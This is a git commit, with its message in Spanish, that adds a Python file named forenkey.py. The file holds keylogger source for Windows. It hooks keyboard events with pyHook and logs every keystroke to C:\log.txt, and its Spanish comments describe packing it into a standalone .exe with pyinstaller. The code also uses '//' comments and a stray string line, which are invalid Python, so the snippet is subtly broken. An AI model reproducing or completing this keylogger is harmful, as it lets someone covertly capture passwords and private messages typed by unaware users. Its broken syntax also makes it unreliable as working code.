fc1ca28ff35776c98d331fab2e0a06d3b54578c3
fjreyesm <franklin.reyes.2003@gmail.com>
2023-07-17 20:20:11 +0200

    primera pripuesta

--- forenkey.py
+++ forenkey.py
@@ -1,1 +1,24 @@
+
 "# forenkey" 
+// genera codigo para un keylogger en python
+// para ejecutarlo en windows
+// se debe convertir a .exe
+// con pyinstaller
+// pyinstaller --onefile forenkey.py
+
+import pyHook, pythoncom, sys, logging
+
+file_log = 'C:\\log.txt'
+
+def OnKeyboardEvent(event):
+    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+    chr(event.Ascii)
+    logging.log(10,chr(event.Ascii))
+    return True
+
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
+pythoncom.PumpMessages()
+
+
